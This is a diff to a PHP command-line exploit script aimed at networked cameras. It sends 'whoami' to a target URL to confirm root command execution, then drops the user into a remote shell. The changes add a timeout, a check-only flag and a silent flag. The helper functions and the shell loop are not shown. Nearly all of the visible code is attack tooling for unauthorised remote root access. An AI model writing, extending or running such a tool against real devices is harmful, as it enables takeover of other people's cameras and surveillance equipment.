@@ -1,17 +1,27 @@
 <?php
 
-$options = getopt('u:');
+ini_set('default_socket_timeout', 5);
+
+$options = getopt('u:c:g:');
 
 if(!isset($options['u'])) {
   die("Option -u not set!\n");
 }
 
-// Run a inital check to make sure the camera is vulnerable
+// Run a initial check to make sure the camera is vulnerable
 echo '';
-$request  = request('whoami', 1);
+$request = request('whoami', 1);
 
 if($request['body'] != 'root' && $request['status'] != 'HTTP/1.1 200 OK') {
-  die("Sorry, the server specified isn't vulnerable.\n");
+  if(!isset($options['g'])) {
+    die("Sorry, the server specified isn't vulnerable.\n");
+  } else {
+    die();
+  }
+}
+
+if(isset($options['c'])) {
+  die("This server is vulnerable, but because you used the -c option you won't be dropped in to a shell.\n");
 }
 
 stream_set_blocking(STDIN, false);
